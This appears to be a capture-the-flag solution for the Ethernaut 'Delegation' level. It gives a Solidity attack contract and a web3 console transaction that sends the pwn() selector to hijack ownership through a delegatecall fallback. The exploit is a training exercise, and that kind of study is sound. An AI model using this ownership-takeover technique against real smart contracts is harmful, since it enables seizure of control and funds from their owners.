// going by using a contract as in the case of DelegateAttack contract
// below, you will successfully take ownership but ownership would be 
// passed unto the contract address not your EOA which will mean
// you didn't pass the level according to ethernaut, hence the need for method2
// which should be run in the console

pragma solidity ^0.8.0;

contract DelegateAttack {

    address delegation;

    constructor(address _ethernaut_delegate){
        delegation = _ethernaut_delegate;
    }

    function attackDelegation() public returns(bool){
     (bool success, ) =   delegation.call(abi.encodeWithSignature("pwn()"));
     return success;
    }
}


// Method2

let functionSig = await web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
    
})

await web3.eth.sendTransaction({
    from: player,
    to: instance,
    data: functionSig
})

